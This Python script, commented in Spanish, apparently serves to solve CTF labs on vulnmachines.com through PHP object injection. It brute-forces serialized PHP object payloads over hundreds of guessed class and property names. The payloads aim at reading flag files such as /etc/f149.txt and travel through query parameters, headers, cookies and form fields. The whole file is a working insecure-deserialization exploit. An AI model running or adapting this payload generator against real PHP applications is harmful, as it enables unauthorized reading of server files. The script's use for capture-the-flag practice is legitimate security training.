#!/usr/bin/env python3
import requests
import urllib.parse
import re

# Configuración de los labs
labs = [
    {
        'url': 'http://hackme11.vulnmachines.com:8056/params',
        'method': 'GET',
        'param': 'vnm',
        'file': '/etc/f149.txt',
        'name': 'Lab 1'
    },
    {
        'url': 'http://hackme11.vulnmachines.com:8071/headers',
        'method': 'HEADER',
        'param': 'x-vnm',
        'file': '/etc/f149.txt',
        'name': 'Lab 2'
    },
    {
        'url': 'http://hackme11.vulnmachines.com:8073/cookies',
        'method': 'COOKIE',
        'param': 'vnm',
        'file': '/tmp/f149.txt',
        'name': 'Lab 3'
    },
    {
        'url': 'http://hackme11.vulnmachines.com:8073/forms',
        'method': 'POST',
        'param': 'payload',
        'file': '/tmp/f149.txt',  # Asumo que es el mismo que Lab 3
        'name': 'Lab 4'
    }
]

# Lista de clases basadas en el contexto del artículo y el CTF
classes = [
    # Basado en el artículo de SecOps
    'Example', 'example', 'EXAMPLE',
    'Sample', 'sample', 'SAMPLE',
    
    # Basado en métodos mágicos PHP
    '__construct', '__destruct', '__toString', '__wakeup', '__sleep',
    'Construct', 'Destruct', 'ToString', 'Wakeup', 'Sleep',
    'construct', 'destruct', 'toString', 'wakeup', 'sleep',
    
    # Nombres relacionados con el lab
    'WhySoSerialize', 'whysoserialize', 'WHYSOSERIALIZE',
    'Serialize', 'serialize', 'SERIALIZE',
    'Unserialize', 'unserialize', 'UNSERIALIZE',
    'Serial', 'serial', 'SERIAL',
    
    # Nombres de archivo
    'FileHandler', 'filehandler', 'FILEHANDLER',
    'FileReader', 'filereader', 'FILEREADER',
    'ReadFile', 'readfile', 'READFILE',
    'FileRead', 'fileread', 'FILEREAD',
    
    # Nombres simples
    'F', 'f', 'R', 'r', 'FR', 'fr', 'RF', 'rf',
    'File', 'file', 'FILE',
    'Read', 'read', 'READ',
    'Flag', 'flag', 'FLAG',
    'Get', 'get', 'GET',
    'Show', 'show', 'SHOW',
    
    # Basado en el objetivo
    'F149', 'f149', 'Flag149', 'flag149',
    'GetFlag', 'getflag', 'GETFLAG',
    'ShowFlag', 'showflag', 'SHOWFLAG',
    'ReadFlag', 'readflag', 'READFLAG',
    'FlagReader', 'flagreader', 'FLAGREADER',
    
    # Nombres del CTF/Sitio
    'VulnMachines', 'vulnmachines', 'VULNMACHINES',
    'Vulnmachine', 'vulnmachine', 'VULNMACHINE',
    'Vuln', 'vuln', 'VULN',
    'VM', 'vm', 'Vm',
    'SecOps', 'secops', 'SECOPS',
    'TheSecOps', 'thesecops', 'THESECOPS',
    
    # Nombres genéricos de CTF
    'Challenge', 'challenge', 'CHALLENGE',
    'Lab', 'lab', 'LAB',
    'Lab1', 'lab1', 'LAB1',
    'Lab2', 'lab2', 'LAB2',
    'Lab3', 'lab3', 'LAB3',
    'Lab4', 'lab4', 'LAB4',
    'CTF', 'ctf', 'Ctf',
    'Exploit', 'exploit', 'EXPLOIT',
    'Payload', 'payload', 'PAYLOAD',
    
    # Más creativos
    'Object', 'object', 'OBJECT',
    'Injection', 'injection', 'INJECTION',
    'ObjectInjection', 'objectinjection', 'OBJECTINJECTION',
    'PHPObject', 'phpobject', 'PHPOBJECT',
    'PHPInjection', 'phpinjection', 'PHPINJECTION'
]

properties = ['file', 'filename', 'path', 'name', 'f', 'fn', 'p', 'n',
              '_file', '_filename', '_path', '__file', '__filename', '__path']

def test_payload(lab, class_name, prop_name):
    """Probar un payload en un lab específico"""
    
    # Crear payload
    file_path = lab['file']
    payload = f'O:{len(class_name)}:"{class_name}":1:{{s:{len(prop_name)}:"{prop_name}";s:{len(file_path)}:"{file_path}";}}'
    
    try:
        if lab['method'] == 'GET':
            encoded = urllib.parse.quote(payload)
            url = f"{lab['url']}?{lab['param']}={encoded}"
            response = requests.get(url, timeout=2)
            
        elif lab['method'] == 'HEADER':
            headers = {lab['param']: payload}
            response = requests.get(lab['url'], headers=headers, timeout=2)
            
        elif lab['method'] == 'COOKIE':
            encoded = urllib.parse.quote(payload)
            headers = {'Cookie': f"{lab['param']}={encoded}"}
            response = requests.get(lab['url'], headers=headers, timeout=2)
            
        elif lab['method'] == 'POST':
            data = {lab['param']: payload}
            response = requests.put(lab['url'], data=data, timeout=2)
        
        # Buscar flag
        if 'vulnmachines{' in response.text.lower():
            matches = re.findall(r'vulnmachines\{[^}]+\}', response.text, re.IGNORECASE)
            if matches:
                return matches[0]
                
    except:
        pass
    
    return None

print("[*] Testing all labs with multiple classes")
print(f"[*] Classes to test: {len(classes)}")
print(f"[*] Properties to test: {len(properties)}")
print(f"[*] Labs: {len(labs)}")
print(f"[*] Total combinations: {len(classes) * len(properties) * len(labs)}")

count = 0
for lab in labs:
    print(f"\n[*] Testing {lab['name']}...")
    
    for cls in classes:
        for prop in properties:
            count += 1
            if count % 100 == 0:
                print(f"    Tested {count} combinations...")
                
            result = test_payload(lab, cls, prop)
            if result:
                print(f"\n[!!!] FLAG FOUND IN {lab['name']}!")
                print(f"[!!!] Class: {cls}")
                print(f"[!!!] Property: {prop}")
                print(f"[!!!] FLAG: {result}")
                exit(0)

print("\n[-] No flags found in any lab")